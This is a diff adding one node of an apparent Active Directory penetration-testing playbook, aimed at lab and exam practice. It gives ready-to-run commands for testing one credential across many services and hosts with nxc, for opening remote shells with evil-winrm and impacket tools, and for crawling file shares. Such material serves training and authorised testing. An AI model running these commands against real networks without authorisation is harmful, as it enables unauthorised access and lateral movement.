@@ -1,0 +1,38 @@
+{
+  "id": "use_creds_first",
+  "phase": "CREDS",
+  "title": "STOP — Use the Credential Before You Escalate",
+  "body": "The most expensive mistake in an AD set is holding a valid credential and reaching for a technique instead of a login. Every credential gets the same treatment before anything clever: try it against every service on every host, and try to open an interactive session with it.\n\nThis applies hardest to assumed-breach creds. If the brief handed you a username and password, that credential is an intended entry point — not just an enumeration key. Using it to query LDAP and never attempting a shell with it is the single most common way to lose an hour to a technique that was never the path.\n\nThis node is the ordering gate. Kerberoasting, silver tickets, ACL abuse, and delegation are what you do AFTER this comes back empty — not instead of it. Sixty seconds here saves the hour. If direct access fails, go to cred_reuse to spray the credential wider and try username variations.",
+  "cmd": "# ==== 1. SET THE CREDENTIAL ==========================\nexport U='user'\nexport P='password'\nexport D='domain.local'\nexport TARGETS='10.10.10.140 10.10.10.141 10.10.10.142'   # or 10.10.10.0/24\n\n# ==== 2. EVERY SERVICE, EVERY HOST ===================\nfor svc in smb winrm mssql rdp ssh ftp; do\n  echo \"===== $svc =====\"\n  nxc $svc $TARGETS -u \"$U\" -p \"$P\" -d \"$D\" 2>/dev/null | grep -F '[+]'\ndone\n\n# (Pwn3d!) means local admin — that is a shell, right now.\n\n# ==== 3. ATTEMPT AN INTERACTIVE SESSION ==============\n# Do NOT skip this because nxc showed no Pwn3d!.\n# WinRM is granted by Remote Management Users, not local admin.\nevil-winrm -i <HOST> -u \"$U\" -p \"$P\"\n\nimpacket-psexec    \"$D/$U:$P@<HOST>\"\nimpacket-wmiexec   \"$D/$U:$P@<HOST>\"\nimpacket-smbexec   \"$D/$U:$P@<HOST>\"\nimpacket-atexec    \"$D/$U:$P@<HOST>\" whoami\nimpacket-mssqlclient \"$D/$U:$P@<HOST>\" -windows-auth\nxfreerdp3 /u:\"$U\" /p:\"$P\" /d:\"$D\" /v:<HOST> /cert:ignore\nssh \"$U@<HOST>\"\n\n# ==== 4. WHAT CAN IT READ? ===========================\nnxc smb $TARGETS -u \"$U\" -p \"$P\" -d \"$D\" --shares | grep -Fv '[' | grep -E 'READ|WRITE'\nnxc smb <HOST> -u \"$U\" -p \"$P\" -d \"$D\" -M spider_plus\n\n# ==== 5. ONLY NOW reach for technique ================\n# BloodHound -> ACLs -> Kerberoast -> AS-REP -> delegation -> tickets",
+  "warn": "No (Pwn3d!) does NOT mean no access. Pwn3d! reports local admin only. WinRM shells come from the Remote Management Users group and MSSQL logins are granted per-login — both are invisible to a Pwn3d! check, and both are common OSCP footholds. Always attempt evil-winrm and mssqlclient by hand even when the spray output looks unremarkable. Check the lockout policy before spraying a password across many accounts, but authenticating one known-good credential against many services is not a spray and carries no lockout risk.",
+  "choices": [
+    {
+      "label": "Got a shell — post-exploitation",
+      "next": "windows_post_exploit"
+    },
+    {
+      "label": "WinRM worked — evil-winrm session",
+      "next": "winrm_access"
+    },
+    {
+      "label": "MSSQL login worked — xp_cmdshell",
+      "next": "mssql"
+    },
+    {
+      "label": "Creds valid, no session — spray wider / try variations",
+      "next": "cred_reuse"
+    },
+    {
+      "label": "Access confirmed nowhere useful — map the graph",
+      "next": "bloodhound"
+    },
+    {
+      "label": "Front door exhausted — now escalate technique",
+      "next": "ad_start"
+    },
+    {
+      "label": "Back to AD menu",
+      "next": "jump_ad"
+    }
+  ]
+}
